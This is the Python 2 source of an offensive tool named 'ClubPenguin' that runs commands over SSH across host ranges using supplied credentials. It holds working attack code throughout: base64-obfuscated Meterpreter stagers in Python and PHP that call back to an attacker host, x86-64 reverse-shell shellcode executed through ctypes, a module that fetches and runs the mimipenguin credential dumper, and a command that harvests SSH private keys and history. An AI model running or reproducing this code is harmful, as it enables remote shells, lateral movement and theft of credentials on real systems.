import base64
import paramiko
import sys
import atexit
import SimpleHTTPServer
import SocketServer
import thread
import argparse
import socket
from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
import threading
import time

CRED = '\033[91m'
CEND = '\033[0m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'


class myssh:
    def __init__(self, host, user, password, port=22):
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print CYELLOW + "[*] Connecting to " + str(host) + "..." + CEND
        client.connect(host, port=port, username=user, password=password, timeout=1)
        atexit.register(client.close)
        self.client = client

    def __call__(self, command, timeout, ip):
        stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
        try:
            sshdata = stdout.readlines()
            print CGREEN + "[+] Executed on " + str(ip) + "!" + CEND
            for line in sshdata:
                print(line)
        except socket.error:
            print CGREEN + "[+] Command sent to " + ip + "..." + CEND


def execute_commands(targets, port, username, password, commands, timeout):
    for ip in targets:
        try:
            remote = myssh(str(ip), username, password)
            for command in commands:
                remote(command, timeout, str(ip))
        except socket.timeout:
            print CRED + "[-] Failed to connect to " + str(ip) + CEND
        except socket.error:
            print CRED + "[-] Failed to connect to " + str(ip) + CEND
        except paramiko.ssh_exception.AuthenticationException:
            print CRED + "[-] Authentication failed!"


def workon(ip, username,password, command, timeout):
    try:
        remote = myssh(str(ip), username, password)
        remote(command, timeout, str(ip))
    except socket.timeout:
        print CRED + "[-] Failed to connect to " + str(ip) + CEND
    except socket.error:
        print CRED + "[-] Failed to connect to " + str(ip) + CEND
    except paramiko.ssh_exception.AuthenticationException:
        print CRED + "[-] Authentication failed!" + CEND


def execute_command(targets, port, username, password, command, timeout):
    threads = []
    for ip in targets:
        t = threading.Thread(target=workon, args=(ip,username,password, command, timeout))
        t.start()
        #t.join()
        time.sleep(1)


def stager_meterpreter_python(listen_ip, listen_port, ip, port, username, password):
    stager = '''
import socket,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('%s',%s))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})

    ''' % (listen_ip, listen_port)
    payload = base64.b64encode(stager, 'utf-8')
    execute_command(ip, port, username, password, "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda"
     " b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &", 5)


def stager_meterpreter_php(listen_ip, listen_port, ip, port, username, password):

        stager = '''
    error_reporting(0);
    $ip   = '%s';
    $port = %s;
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s      = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    } elseif (($f = 'fsockopen') && is_callable($f)) {
        $s      = $f($ip, $port);
        $s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    } else {
        die('no socket funcs');
    }
    if (!$s) {
        die('no socket');
    }
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }
    if (!$len) {
        die();
    }
    $a   = unpack("Nlen", $len);
    $len = $a['len'];
    $b   = '';
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    $GLOBALS['msgsock']      = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();

    ''' % (listen_ip, listen_port)
        payload = base64.b64encode(stager, 'utf-8')
        execute_command(ip, port, username, password, "php -r 'eval(base64_decode(\"" + payload + "\"));'", 1)


def start_server(a,PORT):
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", PORT), Handler)
    print "serving at port", PORT
    httpd.serve_forever()


def get_ip():
    local_ip = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [
        [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in
         [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
    return local_ip


def mimipenguin(lhost, lport, targets, port, username, password):
    print CGREEN + "[!] Spinning up HTTP server..." + CEND
    thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
    time.sleep(3)
    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/mimipenguin.py'); exec(r.read());\" | python &"
    print CGREEN + "[!] Executing mimipenguin on the targets, this may take a while..." + CEND
    execute_command(targets, port, username, password, command, 300)


def parse_targets(target):
    #Stolen from CrackMapExec
    if '-' in target:
        ip_range = target.split('-')
        try:
            hosts = IPRange(ip_range[0], ip_range[1])
        except AddrFormatError:
            try:
                start_ip = IPAddress(ip_range[0])

                start_ip_words = list(start_ip.words)
                start_ip_words[-1] = ip_range[1]
                start_ip_words = [str(v) for v in start_ip_words]

                end_ip = IPAddress('.'.join(start_ip_words))

                t = IPRange(start_ip, end_ip)
            except AddrFormatError:
                t = target
    else:
        try:
            t = IPNetwork(target)
        except AddrFormatError:
            t = target

    if type(t) == IPNetwork or type(t) == IPRange:
        return list(t)
    else:
        return [t.strip()]


def shellcode_meterpreter_64(port,ip):
    hex_port = make_port(port)
    hex_ip = make_ip(ip)
    shellcode = '\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d\\x31\\xc9\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x85\\xc0\\x78\\x5b\\x6a\\x0a\\x41\\x59\\x56\\x50\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x85\\xc0\\x78\\x44\\x48\\x97\\x48\\xb9\\x02\\x00{0}{1}\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x85\\xc0\\x79\\x1b\\x49\\xff\\xc9\\x74\\x22\\x6a\\x23\\x58\\x6a\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x0f\\x05\\x48\\x85\\xc0\\x79\\xb7\\xeb\\x0c\\x59\\x5e\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x02\\xff\\xe6\\x6a\\x3c\\x58\\x6a\\x01\\x5f\\x0f\\x05'.format(hex_port, hex_ip)
    return shellcode


def invoke_shellcode(shellcode):
    the_code = '''
#!/usr/bin/env python
from ctypes import *
libc = cdll.LoadLibrary("libc.so.6")
psc = "{0}"
libc.malloc.restype = c_void_p
libc.malloc(0x400)
sc = libc.malloc(0x400)
page = ((sc >> 12) << 12)
page = cast(page, POINTER(c_void_p))
libc.mprotect.argtype = [c_void_p, c_void_p, c_long]
libc.mprotect(page, 1, 7)
index = 0
for c in psc:
    c_int.from_address
    ptr = c_char.from_address(sc + index)
    ptr.value = c
    index += 1
fn = cast(sc, CFUNCTYPE(c_void_p))
fn()
    '''.format(shellcode)
    return "python -c \"exec(\'" + base64.b64encode(the_code) + "\\n\'.decode(\'base64\'))\" &"


def make_ip(ip_address):
    ip_address =ip_address.split(".")
    hex_ip = ""
    for octet in ip_address:
        hex_ip += ('\\x' + str(hex(int(octet)))[2:4].zfill(2))
    return hex_ip


def make_port(port):
    hex_port = ""
    port = str(hex(int(port)))[2::].zfill(4)
    hex_port += '\\x' + port[0:2].zfill(2)
    hex_port += '\\x' + port[2:4].zfill(2)
    return hex_port


def hunt_keys(targets, username, password):
    command = "echo \"SSH commands found in history:\";find /home /root -name .*_history 2>/dev/null | xargs grep -H \"ssh .*-i\";echo \"Private Keys found:\";find /home/ /root/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null | xargs -d \"\\n\" tail -vn +1"
    print CGREEN + "[!] Searching history files for SSH key usage and searching system for private keys..." + CEND
    execute_command(targets, 22, username, password, command, 300)


def main():
    parser = argparse.ArgumentParser(description='ClubPenguin')
    parser.add_argument("first_arg", nargs=1)
    parser.add_argument('-u','--username', help='SSH username',required=True)
    parser.add_argument('-p','--password',help='SSH password', required=True)
    parser.add_argument('-x','--command',help='Command to execute', required=False)
    parser.add_argument('-m', '--module', help='Module to run', required=False)
    parser.add_argument('-o', '--options', help='Options for module', required=False)
    args = parser.parse_args()
    ip = args.first_arg[0]
    targets = parse_targets(ip)
    if args.command:
        print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
        execute_command(targets, 22, args.username, args.password, args.command, 100)
    if args.options:
        options = dict(x.split('=') for x in args.options.split(' '))

    if args.module == "mimipenguin":
        try:
            lport = options['LPORT']
        except KeyError:
            lport = 8080
        mimipenguin(get_ip(), lport, targets, 22, args.username, args.password)
    if args.module == "keys":
        hunt_keys(targets, args.username, args.password)
    if args.module == "meterpreter":
        try:
            m_ip = options['LHOST']
        except KeyError:
            print "Must supply an LHOST for use with meterpreter"
        try:
            m_port = options['LPORT']
        except KeyError:
            print "Must supply an LPORT for use with meterpreter"
            exit()
        try:
            type = options['TYPE']
        except KeyError:
            type = 'python'

        if type == 'python':
            stager_meterpreter_python(m_ip, m_port, targets, 22, args.username, args.password)
        if type == 'php':
            stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password)
        if type == '64':
            command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
            print CGREEN + "Attempting to execute meterpreter shellcode. Handler: " + str(m_ip) + ":" + str(m_port) + CEND
            execute_command(targets, 22, args.username, args.password, command, 1)





if __name__ == "__main__":

    main()
